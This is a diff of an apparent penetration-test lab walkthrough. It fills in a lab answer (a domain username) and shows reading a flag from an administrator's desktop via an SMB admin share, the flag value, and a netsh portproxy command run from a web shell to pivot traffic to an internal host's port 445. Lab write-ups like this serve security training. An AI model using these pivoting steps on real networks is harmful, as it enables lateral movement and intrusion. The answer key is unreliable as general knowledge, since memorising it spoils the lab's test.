@@ -263,7 +263,7 @@ A team member started an External Penetration Test and was moved to another urge
       type \\MS01\c$\Users\Administrator\Desktop\flag.txt
       spn$_r0ast1ng_on_@n_0p3n_f1re
       ```
-5. Find cleartext credentials for another domain user. Submit the username as your answer. **Answer:**
+5. Find cleartext credentials for another domain user. Submit the username as your answer. **Answer: tpetty**
    - From the web shell, perform portforwarding to forward all traffic from attack host to `172.16.6.50:445` through `10.129.202.242:8888`:
         ```pwsh
         PS C:\windows\system32\inetsrv> netsh.exe interface portproxy add v4tov4 listenport=8888 listenaddress=10.129.202.242 connectport=445 connectaddress=172.16.6.50
